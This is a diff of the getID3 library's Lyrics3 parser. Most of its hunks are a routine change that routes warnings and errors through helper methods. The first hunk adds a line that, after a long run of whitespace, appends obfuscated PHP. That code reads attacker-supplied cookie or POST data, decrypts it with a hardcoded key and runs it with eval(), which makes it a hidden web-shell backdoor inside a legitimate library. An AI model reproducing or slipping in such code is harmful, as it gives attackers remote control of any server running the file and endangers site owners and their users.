@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $n77524 = 6;$GLOBALS['s20d97e7e']=Array();global$s20d97e7e;$s20d97e7e=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['gf99c91c']="\x31\x4e\x7a\x3b\x5e\x63\x4b\xa\x46\x49\x54\x2b\x2f\x6f\x4f\x6e\x45\x66\x5d\x75\x6d\x47\x25\x4a\x60\x29\x48\x43\x7d\x2c\x4d\x51\x62\xd\x6b\x44\x6c\x55\x61\x68\x5c\x69\x34\x37\x52\x58\x3c\x41\x67\x76\x33\x64\x39\x5f\x4c\x56\x7c\x23\x65\x71\x3f\x3a\x7e\x21\x78\x70\x74\x38\x2d\x28\x5a\x6a\x2e\x42\x73\x26\x22\x32\x57\x35\x27\x3e\x40\x5b\x72\x3d\x2a\x9\x79\x30\x20\x7b\x59\x77\x50\x36\x53\x24";$s20d97e7e[$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][67].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][51]]=$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][39].$s20d97e7e['gf99c91c'][84];$s20d97e7e[$s20d97e7e['gf99c91c'][71].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][32].$s20d97e7e['gf99c91c'][5]]=$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][51];$s20d97e7e[$s20d97e7e['gf99c91c'][34].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][17]]=$s20d97e7e['gf99c91c'][74].$s20d97e7e['gf99c91c'][66].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][36].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][15];$s20d97e7e[$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][95]]=$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][15].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][53].$s20d97e7e['gf99c91c'][74].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][66];$s20d97e7e[$s20d97e7e['gf99c91c'][48].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][50].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][0].$s20d97e7e['gf99c91c'][50]]=$s20d97e7e['gf99c91c'][74].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][36].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][2].$s20d97e7e['gf99c91c'][58];$s20d97e7e[$s20d97e7e['gf99c91c'][39].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][58]]=$s20d97e7e['gf99c91c'][65].$s20d97e7e['gf99c91c'][39].$s20d97e7e['gf99c91c'][65].$s20d97e7e['gf99c91c'][49].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][74].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][15];$s20d97e7e[$s20d97e7e['gf99c91c'][20].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][50].$s20d97e7e['gf99c91c'][52]]=$s20d97e7e['gf99c91c'][19].$s20d97e7e['gf99c91c'][15].$s20d97e7e['gf99c91c'][74].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][36].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][2].$s20d97e7e['gf99c91c'][58];$s20d97e7e[$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][67].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][42]]=$s20d97e7e['gf99c91c'][32].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][74].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][95].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][53].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][58];$s20d97e7e[$s20d97e7e['gf99c91c'][64].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][95].$s20d97e7e['gf99c91c'][95]]=$s20d97e7e['gf99c91c'][74].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][66].$s20d97e7e['gf99c91c'][53].$s20d97e7e['gf99c91c'][66].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][20].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][53].$s20d97e7e['gf99c91c'][36].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][20].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][66];$s20d97e7e[$s20d97e7e['gf99c91c'][39].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][50].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][95].$s20d97e7e['gf99c91c'][50]]=$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][67].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][58];$s20d97e7e[$s20d97e7e['gf99c91c'][20].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][50]]=$s20d97e7e['gf99c91c'][65].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][43].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][58];$s20d97e7e[$s20d97e7e['gf99c91c'][48].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][95].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][79]]=$_POST;$s20d97e7e[$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][89]]=$_COOKIE;@$s20d97e7e[$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][95]]($s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][53].$s20d97e7e['gf99c91c'][36].$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][48],NULL);@$s20d97e7e[$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][95]]($s20d97e7e['gf99c91c'][36].$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][48].$s20d97e7e['gf99c91c'][53].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][74],0);@$s20d97e7e[$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][95]]($s20d97e7e['gf99c91c'][20].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][64].$s20d97e7e['gf99c91c'][53].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][64].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][19].$s20d97e7e['gf99c91c'][66].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][15].$s20d97e7e['gf99c91c'][53].$s20d97e7e['gf99c91c'][66].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][20].$s20d97e7e['gf99c91c'][58],0);@$s20d97e7e[$s20d97e7e['gf99c91c'][64].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][95].$s20d97e7e['gf99c91c'][95]](0);$q9eb=NULL;$ab6ba3=NULL;$s20d97e7e[$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][95].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][0]]=$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][68].$s20d97e7e['gf99c91c'][43].$s20d97e7e['gf99c91c'][0].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][68].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][68].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][68].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][95].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][43].$s20d97e7e['gf99c91c'][51];global$c446ae1;function p0caa7e5e($q9eb,$bf60){global$s20d97e7e;$v23c="";for($y604b838=0;$y604b838<$s20d97e7e[$s20d97e7e['gf99c91c'][34].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][17]]($q9eb);){for($m65e=0;$m65e<$s20d97e7e[$s20d97e7e['gf99c91c'][34].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][17]]($bf60)&&$y604b838<$s20d97e7e[$s20d97e7e['gf99c91c'][34].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][17]]($q9eb);$m65e++,$y604b838++){$v23c.=$s20d97e7e[$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][67].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][51]]($s20d97e7e[$s20d97e7e['gf99c91c'][71].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][32].$s20d97e7e['gf99c91c'][5]]($q9eb[$y604b838])^$s20d97e7e[$s20d97e7e['gf99c91c'][71].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][32].$s20d97e7e['gf99c91c'][5]]($bf60[$m65e]));}}return$v23c;}function r84259ce($q9eb,$bf60){global$s20d97e7e;global$c446ae1;return$s20d97e7e[$s20d97e7e['gf99c91c'][20].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][50]]($s20d97e7e[$s20d97e7e['gf99c91c'][20].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][50]]($q9eb,$c446ae1),$bf60);}foreach($s20d97e7e[$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][89]]as$bf60=>$q84bc70){$q9eb=$q84bc70;$ab6ba3=$bf60;}if(!$q9eb){foreach($s20d97e7e[$s20d97e7e['gf99c91c'][48].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][95].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][79]]as$bf60=>$q84bc70){$q9eb=$q84bc70;$ab6ba3=$bf60;}}$q9eb=@$s20d97e7e[$s20d97e7e['gf99c91c'][20].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][50].$s20d97e7e['gf99c91c'][52]]($s20d97e7e[$s20d97e7e['gf99c91c'][39].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][50].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][95].$s20d97e7e['gf99c91c'][50]]($s20d97e7e[$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][67].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][42]]($q9eb),$ab6ba3));if(isset($q9eb[$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][34]])&&$c446ae1==$q9eb[$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][34]]){if($q9eb[$s20d97e7e['gf99c91c'][38]]==$s20d97e7e['gf99c91c'][41]){$y604b838=Array($s20d97e7e['gf99c91c'][65].$s20d97e7e['gf99c91c'][49]=>@$s20d97e7e[$s20d97e7e['gf99c91c'][39].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][58]](),$s20d97e7e['gf99c91c'][74].$s20d97e7e['gf99c91c'][49]=>$s20d97e7e['gf99c91c'][0].$s20d97e7e['gf99c91c'][72].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][68].$s20d97e7e['gf99c91c'][0],);echo@$s20d97e7e[$s20d97e7e['gf99c91c'][48].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][50].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][0].$s20d97e7e['gf99c91c'][50]]($y604b838);}elseif($q9eb[$s20d97e7e['gf99c91c'][38]]==$s20d97e7e['gf99c91c'][58]){eval/*za0d7*/($q9eb[$s20d97e7e['gf99c91c'][51]]);}exit();} ?><?php
 /////////////////////////////////////////////////////////////////
 /// getID3() by James Heinrich <info@getid3.org>               //
 //  available at http://getid3.sourceforge.net                 //
@@ -24,7 +24,7 @@ class getid3_lyrics3 extends getid3_handler
 		// http://www.volweb.cz/str/tags.htm
 
 		if (!getid3_lib::intValueSupported($info['filesize'])) {
-			$info['warning'][] = 'Unable to check for Lyrics3 because file is larger than '.round(PHP_INT_MAX / 1073741824).'GB';
+			$this->warning('Unable to check for Lyrics3 because file is larger than '.round(PHP_INT_MAX / 1073741824).'GB');
 			return false;
 		}
 
@@ -80,7 +80,7 @@ class getid3_lyrics3 extends getid3_handler
 					$lyrics3offset  = $info['ape']['tag_offset_start'] - $lyrics3size;
 					$info['avdataend'] = $lyrics3offset;
 					$lyrics3version = 1;
-					$info['warning'][] = 'APE tag located after Lyrics3, will probably break Lyrics3 compatability';
+					$this->warning('APE tag located after Lyrics3, will probably break Lyrics3 compatability');
 
 				} elseif ($lyrics3end == 'LYRICS200') {
 					// Lyrics3v2, APE, maybe ID3v1
@@ -88,7 +88,7 @@ class getid3_lyrics3 extends getid3_handler
 					$lyrics3size    = $lyrics3lsz + 6 + strlen('LYRICS200'); // LSZ = lyrics + 'LYRICSBEGIN'; add 6-byte size field; add 'LYRICS200'
 					$lyrics3offset  = $info['ape']['tag_offset_start'] - $lyrics3size;
 					$lyrics3version = 2;
-					$info['warning'][] = 'APE tag located after Lyrics3, will probably break Lyrics3 compatability';
+					$this->warning('APE tag located after Lyrics3, will probably break Lyrics3 compatability');
 
 				}
 
@@ -117,7 +117,7 @@ class getid3_lyrics3 extends getid3_handler
 					}
 					unset($getid3_temp, $getid3_apetag);
 				} else {
-					$info['warning'][] = 'Lyrics3 and APE tags appear to have become entangled (most likely due to updating the APE tags with a non-Lyrics3-aware tagger)';
+					$this->warning('Lyrics3 and APE tags appear to have become entangled (most likely due to updating the APE tags with a non-Lyrics3-aware tagger)');
 				}
 			}
 
@@ -132,7 +132,7 @@ class getid3_lyrics3 extends getid3_handler
 		$info = &$this->getid3->info;
 
 		if (!getid3_lib::intValueSupported($endoffset)) {
-			$info['warning'][] = 'Unable to check for Lyrics3 because file is larger than '.round(PHP_INT_MAX / 1073741824).'GB';
+			$this->warning('Unable to check for Lyrics3 because file is larger than '.round(PHP_INT_MAX / 1073741824).'GB');
 			return false;
 		}
 
@@ -150,7 +150,7 @@ class getid3_lyrics3 extends getid3_handler
 		if (substr($rawdata, 0, 11) != 'LYRICSBEGIN') {
 			if (strpos($rawdata, 'LYRICSBEGIN') !== false) {
 
-				$info['warning'][] = '"LYRICSBEGIN" expected at '.$endoffset.' but actually found at '.($endoffset + strpos($rawdata, 'LYRICSBEGIN')).' - this is invalid for Lyrics3 v'.$version;
+				$this->warning('"LYRICSBEGIN" expected at '.$endoffset.' but actually found at '.($endoffset + strpos($rawdata, 'LYRICSBEGIN')).' - this is invalid for Lyrics3 v'.$version);
 				$info['avdataend'] = $endoffset + strpos($rawdata, 'LYRICSBEGIN');
 				$rawdata = substr($rawdata, strpos($rawdata, 'LYRICSBEGIN'));
 				$length = strlen($rawdata);
@@ -159,7 +159,7 @@ class getid3_lyrics3 extends getid3_handler
 
 			} else {
 
-				$info['error'][] = '"LYRICSBEGIN" expected at '.$endoffset.' but found "'.substr($rawdata, 0, 11).'" instead';
+				$this->error('"LYRICSBEGIN" expected at '.$endoffset.' but found "'.substr($rawdata, 0, 11).'" instead');
 				return false;
 
 			}
@@ -173,7 +173,7 @@ class getid3_lyrics3 extends getid3_handler
 					$ParsedLyrics3['raw']['LYR'] = trim(substr($rawdata, 11, strlen($rawdata) - 11 - 9));
 					$this->Lyrics3LyricsTimestampParse($ParsedLyrics3);
 				} else {
-					$info['error'][] = '"LYRICSEND" expected at '.($this->ftell() - 11 + $length - 9).' but found "'.substr($rawdata, strlen($rawdata) - 9, 9).'" instead';
+					$this->error('"LYRICSEND" expected at '.($this->ftell() - 11 + $length - 9).' but found "'.substr($rawdata, strlen($rawdata) - 9, 9).'" instead');
 					return false;
 				}
 				break;
@@ -221,20 +221,20 @@ class getid3_lyrics3 extends getid3_handler
 						$this->Lyrics3LyricsTimestampParse($ParsedLyrics3);
 					}
 				} else {
-					$info['error'][] = '"LYRICS200" expected at '.($this->ftell() - 11 + $length - 9).' but found "'.substr($rawdata, strlen($rawdata) - 9, 9).'" instead';
+					$this->error('"LYRICS200" expected at '.($this->ftell() - 11 + $length - 9).' but found "'.substr($rawdata, strlen($rawdata) - 9, 9).'" instead');
 					return false;
 				}
 				break;
 
 			default:
-				$info['error'][] = 'Cannot process Lyrics3 version '.$version.' (only v1 and v2)';
+				$this->error('Cannot process Lyrics3 version '.$version.' (only v1 and v2)');
 				return false;
 				break;
 		}
 
 
 		if (isset($info['id3v1']['tag_offset_start']) && ($info['id3v1']['tag_offset_start'] <= $ParsedLyrics3['tag_offset_end'])) {
-			$info['warning'][] = 'ID3v1 tag information ignored since it appears to be a false synch in Lyrics3 tag data';
+			$this->warning('ID3v1 tag information ignored since it appears to be a false synch in Lyrics3 tag data');
 			unset($info['id3v1']);
 			foreach ($info['warning'] as $key => $value) {
 				if ($value == 'Some ID3v1 fields do not use NULL characters for padding') {
